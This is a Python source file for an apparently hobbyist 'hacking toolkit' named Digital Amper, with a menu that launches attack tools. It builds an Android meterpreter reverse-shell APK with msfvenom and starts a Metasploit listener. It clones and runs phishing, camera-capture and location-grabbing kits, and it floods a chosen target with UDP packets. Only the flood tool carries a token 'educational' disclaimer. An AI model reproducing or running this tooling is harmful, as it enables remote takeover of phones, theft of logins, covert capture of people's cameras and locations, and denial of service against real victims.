#!/usr/bin/env python3
import os
import sys
import time
import json
import requests
import subprocess
from typing import Optional, Dict, Any
from enum import Enum
import platform
import argparse
import socket
import webbrowser
from pathlib import Path

class Color:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Tool(Enum):
    """Enumeration of available tools"""
    IP_TRACKER = 1
    GPS_TRACKER = 2
    CAMERA_HACK = 3
    PAYLOAD_GEN = 4
    VIRUS_PRANK = 5
    PHISHING = 6
    PORT_SCAN = 7
    DOS_TOOL = 8

class DigitalAmper:
    """Main application class for Digital Amper toolkit"""
    
    def __init__(self):
        self.version = "1.2.0"
        self.author = "@thedigamber"
        self.instagram_url = "https://www.instagram.com/thedigamber?igsh=MXA5dDV5aHRub3Z3cQ=="
        self.required_packages = [
            'requests', 'colorama'
        ]
        self.tools_dir = Path.home() / ".digital_amper"
        self.config_file = self.tools_dir / "config.json"
        self._setup_environment()
        
    def _setup_environment(self) -> None:
        """Ensure required directories and files exist"""
        try:
            self.tools_dir.mkdir(exist_ok=True)
            if not self.config_file.exists():
                with open(self.config_file, 'w') as f:
                    json.dump({"first_run": True}, f)
        except Exception as e:
            self.error(f"Failed to setup environment: {e}")
            sys.exit(1)

    def clear_screen(self) -> None:
        """Clear terminal screen based on OS"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def display_banner(self) -> None:
        """Display the application banner with Instagram promotion"""
        self.clear_screen()
        banner = f"""
{Color.RED}██████╗ ██╗ ██████╗  █████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
{Color.GREEN}██╔══██╗██║██╔════╝ ██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
{Color.YELLOW}██████╔╝██║██║  ███╗███████║██╔████╔██║██████╔╝█████╗  ██████╔╝
{Color.BLUE}██╔═══╝ ██║██║   ██║██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔═══╝ 
{Color.MAGENTA}██║     ██║╚██████╔╝██║  ██║██║ ╚═╝ ██║██║     ███████╗██║     
{Color.CYAN}╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝{Color.RESET}

            {Color.BOLD}v{self.version} by {self.author}{Color.RESET}
    {Color.UNDERLINE}Follow me on Instagram: {self.instagram_url}{Color.RESET}
"""
        print(banner)

    def display_menu(self) -> None:
        """Display the main menu"""
        menu = f"""
{Color.BOLD}Core Tools:{Color.RESET}
{Color.GREEN}[1] IP Tracker 🌐        {Color.YELLOW}[5] Virus Prank 💀
{Color.GREEN}[2] GPS Tracker 📍      {Color.YELLOW}[6] Phishing Toolkit 🎣
{Color.GREEN}[3] Camera Hack 📷      {Color.YELLOW}[7] Port Scanner 🔍
{Color.GREEN}[4] Payload Generator 📱{Color.YELLOW}[8] DoS Tool ⚡

{Color.RED}[0] Exit ❌{Color.RESET}

{Color.CYAN}Follow for more tools: {self.instagram_url}{Color.RESET}
"""
        print(menu)

    def error(self, message: str) -> None:
        """Display error message"""
        print(f"{Color.RED}[!] ERROR: {message}{Color.RESET}")

    def success(self, message: str) -> None:
        """Display success message"""
        print(f"{Color.GREEN}[+] {message}{Color.RESET}")

    def warning(self, message: str) -> None:
        """Display warning message"""
        print(f"{Color.YELLOW}[!] {message}{Color.RESET}")

    def info(self, message: str) -> None:
        """Display informational message"""
        print(f"{Color.BLUE}[*] {message}{Color.RESET}")

    def check_dependencies(self) -> bool:
        """Check if required dependencies are installed"""
        missing = []
        for pkg in self.required_packages:
            try:
                __import__(pkg)
            except ImportError:
                missing.append(pkg)
        
        if missing:
            self.warning(f"Missing packages: {', '.join(missing)}")
            if self.confirm("Install missing packages?"):
                self.install_packages(missing)
                return True
            return False
        return True

    def install_packages(self, packages: list) -> None:
        """Install required Python packages"""
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install'] + packages)
            self.success("Packages installed successfully")
        except subprocess.CalledProcessError as e:
            self.error(f"Failed to install packages: {e}")

    def confirm(self, question: str) -> bool:
        """Ask for user confirmation"""
        response = input(f"{question} (y/N): ").strip().lower()
        return response == 'y'

    def track_ip(self) -> None:
        """Track an IP address using ip-api.com"""
        self.info("IP Tracker Tool")
        ip = input("Enter IP address or domain: ").strip()
        
        if not ip:
            self.error("No IP address provided")
            return
            
        try:
            self.info(f"Tracking IP: {ip}")
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, timeout=10)
            data = response.json()
            
            if data.get('status') == 'success':
                print(f"\n{Color.GREEN}IP Information:{Color.RESET}")
                print(f"Country: {data.get('country', 'N/A')}")
                print(f"Region: {data.get('regionName', 'N/A')}")
                print(f"City: {data.get('city', 'N/A')}")
                print(f"ZIP: {data.get('zip', 'N/A')}")
                print(f"ISP: {data.get('isp', 'N/A')}")
                print(f"Org: {data.get('org', 'N/A')}")
                print(f"AS: {data.get('as', 'N/A')}")
                print(f"Latitude: {data.get('lat', 'N/A')}")
                print(f"Longitude: {data.get('lon', 'N/A')}")
                print(f"Timezone: {data.get('timezone', 'N/A')}")
            else:
                self.error(f"Failed to track IP: {data.get('message', 'Unknown error')}")
        except requests.exceptions.RequestException as e:
            self.error(f"Network error: {e}")
        except json.JSONDecodeError:
            self.error("Invalid response from server")

    def gps_tracker(self) -> None:
        """GPS tracking using seeker"""
        self.info("GPS Tracker Tool")
        if not self.confirm("This will clone seeker repository. Continue?"):
            return
            
        try:
            seeker_path = self.tools_dir / "seeker"
            if not seeker_path.exists():
                self.info("Cloning seeker repository...")
                subprocess.run(["git", "clone", "https://github.com/thewhiteh4t/seeker", str(seeker_path)], check=True)
                
            self.info("Installing seeker dependencies...")
            os.chdir(seeker_path)
            subprocess.run(["bash", "install.sh"], check=True)
            
            self.success("Seeker installed successfully")
            if self.confirm("Start seeker now?"):
                subprocess.run(["python3", "seeker.py"])
        except subprocess.CalledProcessError as e:
            self.error(f"Failed to setup seeker: {e}")
        except Exception as e:
            self.error(f"Unexpected error: {e}")

    def camera_hack(self) -> None:
        """Camera phishing tool"""
        self.info("Camera Phishing Tool")
        if not self.confirm("This will clone CamPhish repository. Continue?"):
            return
            
        try:
            camphish_path = self.tools_dir / "CamPhish"
            if not camphish_path.exists():
                self.info("Cloning CamPhish repository...")
                subprocess.run(["git", "clone", "https://github.com/techchipnet/CamPhish", str(camphish_path)], check=True)
                
            self.success("CamPhish installed successfully")
            if self.confirm("Start CamPhish now?"):
                os.chdir(camphish_path)
                subprocess.run(["bash", "camphish.sh"])
        except subprocess.CalledProcessError as e:
            self.error(f"Failed to setup CamPhish: {e}")
        except Exception as e:
            self.error(f"Unexpected error: {e}")

    def generate_payload(self) -> None:
        """Generate APK payload using msfvenom"""
        self.info("Payload Generator Tool")
        
        if not self.is_installed("msfvenom"):
            self.error("msfvenom not found. Please install Metasploit Framework first.")
            return
            
        try:
            host = input("Enter LHOST (Your IP): ").strip()
            port = input("Enter LPORT (e.g. 4444): ").strip()
            output = input("Enter output file name (e.g. hack.apk): ").strip()
            
            if not all([host, port, output]):
                self.error("All fields are required")
                return
                
            self.info("Generating payload...")
            command = [
                "msfvenom",
                "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={host}",
                f"LPORT={port}",
                "-o", output
            ]
            
            subprocess.run(command, check=True)
            self.success(f"Payload generated: {output}")
            
            if self.confirm("Create listener configuration?"):
                self._create_listener_config(host, port)
        except subprocess.CalledProcessError as e:
            self.error(f"Payload generation failed: {e}")
        except Exception as e:
            self.error(f"Unexpected error: {e}")

    def _create_listener_config(self, host: str, port: str) -> None:
        """Create Metasploit listener configuration"""
        config = f"""use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST {host}
set LPORT {port}
exploit
"""
        config_path = "listener.rc"
        try:
            with open(config_path, 'w') as f:
                f.write(config)
            self.success(f"Listener config created: {config_path}")
            if self.confirm("Start listener now?"):
                subprocess.run(["msfconsole", "-r", config_path])
        except IOError as e:
            self.error(f"Failed to create config: {e}")

    def virus_prank(self) -> None:
        """Fake virus prank"""
        self.info("Virus Prank Tool")
        print("\nThis will simulate a phone hack and open a Rick Roll video.")
        
        if not self.confirm("Continue with prank?"):
            return
            
        try:
            print("\nSimulating phone hack in 3...")
            for i in range(3, 0, -1):
                time.sleep(1)
                print(f"{i}...")
                
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            self.success("Prank executed! 😈")
            print(f"\n{Color.CYAN}Follow me on Instagram for more fun tools: {self.instagram_url}{Color.RESET}")
        except Exception as e:
            self.error(f"Prank failed: {e}")

    def phishing_tool(self) -> None:
        """Phishing toolkit"""
        self.info("Phishing Toolkit")
        if not self.confirm("This will clone zphisher repository. Continue?"):
            return
            
        try:
            zphisher_path = self.tools_dir / "zphisher"
            if not zphisher_path.exists():
                self.info("Cloning zphisher repository...")
                subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher", str(zphisher_path)], check=True)
                
            self.success("zphisher installed successfully")
            if self.confirm("Start zphisher now?"):
                os.chdir(zphisher_path)
                subprocess.run(["bash", "zphisher.sh"])
        except subprocess.CalledProcessError as e:
            self.error(f"Failed to setup zphisher: {e}")
        except Exception as e:
            self.error(f"Unexpected error: {e}")

    def port_scanner(self) -> None:
        """Simple port scanner"""
        self.info("Port Scanner Tool")
        target = input("Enter target IP or domain: ").strip()
        if not target:
            self.error("No target specified")
            return
            
        try:
            # Resolve domain to IP if needed
            ip = socket.gethostbyname(target)
            self.info(f"Scanning {target} ({ip})")
            
            start_port = int(input("Start port (1-65535): ") or 1)
            end_port = int(input("End port (1-65535): ") or 1024)
            
            if not (1 <= start_port <= 65535) or not (1 <= end_port <= 65535):
                self.error("Ports must be between 1 and 65535")
                return
                
            if start_port > end_port:
                start_port, end_port = end_port, start_port
                
            timeout = float(input("Timeout in seconds (0.5-5): ") or 1)
            if not (0.5 <= timeout <= 5):
                self.error("Timeout must be between 0.5 and 5 seconds")
                return
                
            self.info(f"Scanning ports {start_port}-{end_port}...")
            open_ports = []
            
            for port in range(start_port, end_port + 1):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(timeout)
                        result = s.connect_ex((ip, port))
                        if result == 0:
                            open_ports.append(port)
                            service = socket.getservbyport(port, 'tcp') if port <= 1024 else "unknown"
                            print(f"{Color.GREEN}Port {port} ({service}) is open{Color.RESET}")
                except (socket.error, socket.timeout):
                    continue
                except KeyboardInterrupt:
                    self.warning("Scan interrupted by user")
                    break
                    
            if open_ports:
                self.success(f"Found {len(open_ports)} open ports")
            else:
                self.warning("No open ports found")
        except socket.gaierror:
            self.error("Could not resolve hostname")
        except ValueError:
            self.error("Invalid port number")
        except Exception as e:
            self.error(f"Scan failed: {e}")

    def dos_tool(self) -> None:
        """Simple DoS simulation tool"""
        self.warning("WARNING: This tool is for educational purposes only")
        self.warning("Unauthorized testing against networks you don't own is illegal")
        
        if not self.confirm("Do you understand and accept responsibility?"):
            return
            
        self.info("DoS Simulation Tool")
        target = input("Enter target IP or domain: ").strip()
        if not target:
            self.error("No target specified")
            return
            
        try:
            port = int(input("Enter target port (1-65535): ") or 80)
            if not (1 <= port <= 65535):
                self.error("Invalid port number")
                return
                
            duration = int(input("Duration in seconds (1-60): ") or 10)
            if not (1 <= duration <= 60):
                self.error("Duration must be between 1 and 60 seconds")
                return
                
            self.info(f"Starting DoS simulation against {target}:{port} for {duration} seconds...")
            
            # Create a socket and send garbage data
            start_time = time.time()
            packets_sent = 0
            
            try:
                while time.time() - start_time < duration:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                            s.sendto(os.urandom(1024), (target, port))
                            packets_sent += 1
                    except:
                        continue
                        
                self.success(f"Sent {packets_sent} packets in {duration} seconds")
                print(f"\n{Color.CYAN}Follow for more security tools: {self.instagram_url}{Color.RESET}")
            except KeyboardInterrupt:
                self.warning("Attack interrupted by user")
        except ValueError:
            self.error("Invalid input")
        except Exception as e:
            self.error(f"Attack failed: {e}")

    def is_installed(self, command: str) -> bool:
        """Check if a command is available in PATH"""
        try:
            subprocess.run([command, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except FileNotFoundError:
            return False

    def run(self) -> None:
        """Main application loop"""
        if not self.check_dependencies():
            self.error("Required dependencies are missing")
            return
            
        while True:
            self.display_banner()
            self.display_menu()
            
            try:
                choice = input("\nChoose an option: ").strip()
                if not choice:
                    continue
                    
                if choice == '0':
                    self.info("Exiting Digital Amper. Jai Shree Ram! 🙏")
                    print(f"{Color.CYAN}Don't forget to follow on Instagram: {self.instagram_url}{Color.RESET}")
                    break
                    
                tool = Tool(int(choice))
                self.clear_screen()
                
                if tool == Tool.IP_TRACKER:
                    self.track_ip()
                elif tool == Tool.GPS_TRACKER:
                    self.gps_tracker()
                elif tool == Tool.CAMERA_HACK:
                    self.camera_hack()
                elif tool == Tool.PAYLOAD_GEN:
                    self.generate_payload()
                elif tool == Tool.VIRUS_PRANK:
                    self.virus_prank()
                elif tool == Tool.PHISHING:
                    self.phishing_tool()
                elif tool == Tool.PORT_SCAN:
                    self.port_scanner()
                elif tool == Tool.DOS_TOOL:
                    self.dos_tool()
                else:
                    self.error("Invalid choice")
                    
                input("\nPress Enter to return to menu...")
            except ValueError:
                self.error("Please enter a valid number")
            except KeyboardInterrupt:
                self.info("\nOperation cancelled by user")
                time.sleep(1)
            except Exception as e:
                self.error(f"Unexpected error: {e}")
                time.sleep(2)

def main():
    """Entry point for the application"""
    parser = argparse.ArgumentParser(description="Digital Amper - Advanced Security Toolkit")
    parser.add_argument('-v', '--version', action='store_true', help="Show version information")
    
    args = parser.parse_args()
    app = DigitalAmper()
    
    if args.version:
        print(f"Digital Amper v{app.version}")
        print(f"Follow the developer: {app.instagram_url}")
        return
        
    try:
        app.run()
    except KeyboardInterrupt:
        print("\nExiting...")
        print(f"{Color.CYAN}Follow for more tools: {app.instagram_url}{Color.RESET}")
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
